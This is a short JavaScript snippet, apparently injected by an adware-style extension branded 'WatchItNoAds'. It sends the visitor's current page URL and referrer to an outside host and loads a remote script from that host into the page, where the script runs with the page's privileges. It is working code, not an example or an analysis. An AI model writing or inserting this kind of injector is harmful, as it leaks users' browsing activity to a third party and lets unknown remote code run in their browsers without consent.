
(function () {
    var url = 'http://tb.shopon.com/js.php?mb=5oR&subid=287609&brand=WatchItNoAds&action=check&referer=' + encodeURIComponent(document.referrer) + '&url=' + encodeURIComponent(location.href);

    var c = document.createElement('script');
    c.async=true; 
    c.src = url;
    (document.body || document.head || document.documentElement).appendChild(c);
})();
